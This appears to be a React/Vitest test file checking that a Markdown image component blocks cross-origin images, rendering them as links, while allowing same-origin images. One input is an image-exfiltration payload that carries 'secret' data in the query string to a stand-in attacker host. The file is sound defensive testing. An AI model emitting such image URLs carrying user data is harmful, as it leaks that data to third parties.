import { render } from '@testing-library/react';
import { describe, expect, it } from 'vitest';
import { Markdown } from '../../src/components/Markdown';
import { MarkdownImage } from '../../src/components/MarkdownImage';

describe('MarkdownImage', () => {
  it('renders cross-origin Markdown images as links', () => {
    const { container } = render(
      <Markdown>{'![x](https://attacker.example/p?d=secret)'}</Markdown>,
    );

    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a')?.getAttribute('href')).toBe(
      'https://attacker.example/p?d=secret',
    );
  });

  it('renders relative same-origin images', () => {
    const { container } = render(<MarkdownImage src='/images/a.png' alt='x' />);

    expect(container.querySelector('img')?.getAttribute('src')).toBe('/images/a.png');
  });

  it('renders absolute same-origin images', () => {
    const src = `${window.location.origin}/a.png`;
    const { container } = render(<MarkdownImage src={src} alt='x' />);

    expect(container.querySelector('img')?.getAttribute('src')).toBe(src);
  });

  it('does not render protocol-relative cross-origin images', () => {
    const { container } = render(<MarkdownImage src='//attacker.example/a.png' alt='x' />);

    expect(container.querySelector('img')).toBeNull();
  });

  it('shows alt text when the source is empty or undefined', () => {
    const emptySource = render(<MarkdownImage src='' alt='empty alt' />);
    const undefinedSource = render(<MarkdownImage src={undefined} alt='undefined alt' />);

    expect(emptySource.container.querySelector('img')).toBeNull();
    expect(emptySource.container.textContent).toBe('empty alt');
    expect(undefinedSource.container.querySelector('img')).toBeNull();
    expect(undefinedSource.container.textContent).toBe('undefined alt');
  });
});
